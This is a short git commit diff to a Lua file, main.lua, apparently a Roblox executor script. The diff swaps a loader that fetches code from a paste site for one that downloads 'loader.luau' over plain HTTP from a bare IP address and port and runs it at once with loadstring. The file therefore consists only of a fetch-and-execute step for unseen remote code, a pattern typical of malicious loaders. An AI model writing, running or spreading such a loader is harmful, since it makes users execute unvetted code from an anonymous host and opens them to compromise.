b6ee90bd61e5243b22515c46e48aac1b154f3aa3
FlashScripts0 <jesterxdlmao@gmail.com>
2025-12-07 21:16:48 +0100

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://paste.debian.net/plainh/d87a2685/", true))()
+ID="28f0939b-453a-4d64-bddc-6f87791fc82f";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
